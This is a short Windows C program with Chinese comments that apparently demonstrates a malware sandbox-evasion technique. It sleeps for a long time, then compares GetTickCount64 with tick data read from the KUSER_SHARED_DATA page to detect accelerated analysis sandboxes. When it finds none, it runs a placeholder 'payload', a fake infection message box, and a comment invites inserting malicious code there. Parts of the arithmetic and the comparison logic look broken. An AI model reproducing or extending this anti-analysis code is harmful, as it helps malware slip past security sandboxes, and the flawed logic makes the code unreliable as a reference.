#include <windows.h>
#include <stdio.h>

bool CheckSandboxUsingKUserSharedData() {
    // 进行长时间休眠
    Sleep(1000000);  // 休眠1000秒

    // 指向KUSER_SHARED_DATA结构的指针
    ULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
    LONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;
    ULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;

    // 获取系统滴答计数
    DWORD time = GetTickCount64();

    // 读取内核时间
    DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
                       ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);

    // 检查滴答计数与内核时间的差异
    if ((time - kernelTime) > 100 && (kernelTime - time) > 100) {
        return false;  // 检测到沙箱操纵
    }

    return true;  // 没有检测到沙箱操纵
}

int main() {
    if (!CheckSandboxUsingKUserSharedData()) {
        printf("Running inside a sandbox.\n");
        return 0;
    }

    printf("Not running inside a sandbox.\n");

    // 这里插入恶意代码，比如显示一个弹窗消息
    MessageBoxA(NULL, "You have been infected by a malware!", "Malware Alert", MB_OK | MB_ICONWARNING);

    return 0;
}
